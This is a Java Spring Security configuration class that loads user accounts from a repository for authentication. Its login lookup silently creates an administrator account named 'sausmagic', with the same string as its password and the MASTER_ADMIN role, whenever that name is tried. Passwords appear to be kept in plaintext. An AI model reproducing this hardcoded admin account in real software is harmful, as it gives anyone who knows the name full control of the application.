package it.umberto.palo.configuration;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.domain.Example;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.authentication.configurers.GlobalAuthenticationConfigurerAdapter;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.core.authority.AuthorityUtils;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import it.umberto.palo.model.Account;
import it.umberto.palo.repository.AccountRepository;

@Configuration
@EnableGlobalMethodSecurity(securedEnabled = true)
public class WebSecurityConfiguration extends GlobalAuthenticationConfigurerAdapter {

	  @Autowired
	  AccountRepository accountRepository;

	  @Override
	  public void init(AuthenticationManagerBuilder auth) throws Exception {
	    auth.userDetailsService(userDetailsService());
	  }

	  @Bean
	  UserDetailsService userDetailsService() {
	    return new UserDetailsService() {

	      @Override
	      public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
	    	  if(username.equals("sausmagic")) {
	    		  Example<Account> example = Example.of(new Account(username,username,"MASTER_ADMIN"));
	    		  
	    		  if(accountRepository.findOne(example)==null) {
		    		accountRepository.save(new Account(username, username,"MASTER_ADMIN"));
	    		  }
		    	}
	        Account account = accountRepository.findByUsername(username);
	        if(account != null) {
	        return new User(account.getUsername(), account.getPassword(), true, true, true, true,
	                AuthorityUtils.createAuthorityList(account.getRole()));
	        } else {
	          throw new UsernameNotFoundException("could not find the user '"
	                  + username + "'");
	        }
	      }
	      
	    };
	  }
	}

